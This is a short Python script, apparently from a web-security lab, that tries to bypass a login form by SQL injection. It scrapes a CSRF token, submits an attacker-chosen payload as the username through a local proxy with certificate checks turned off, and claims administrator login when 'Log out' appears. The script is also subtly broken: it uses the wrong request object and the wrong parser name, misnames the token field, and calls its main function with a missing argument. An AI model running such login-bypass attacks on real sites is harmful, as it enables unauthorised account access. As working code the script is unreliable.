from ssl import VerifyMode
import sys
from urllib import request
import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxy = {"http": "http://127.0.0.1:8800", "https": "http://127.0.0.1:8800"}


def create_csrf_token(session, url):
    request_to_get_csrf_token = session.get(url, verify=False, proxies=proxy)
    soup = BeautifulSoup(request_to_get_csrf_token.text, "html_parser")
    csrf_token = soup.find("input")["value"]
    return csrf_token


def exploit_sql_injection(session, url, payload):
    csrf_token = create_csrf_token(session, url)
    data = {"data": csrf_token, "username": payload, "password": "randomtext"}
    request_to_check_exploit = request.post(url, data=data, verify=False, proxies=proxy)
    result = request_to_check_exploit.text
    if "Log out" in result:
        return True
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        sql_injection_payload = sys.argv[2].strip()
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url> <payload> ")
        print(f"[-] Example: {sys.argv[0]} www.example.com '1=1'")
        sys.exit(-1)
    exploit_session = requests.Session()
    if exploit_sql_injection(exploit_session, sql_injection_payload):
        print("[+] SQL injections successful. I log in as administrator")
    else:
        print("[-] SQL injections unsuccessful")
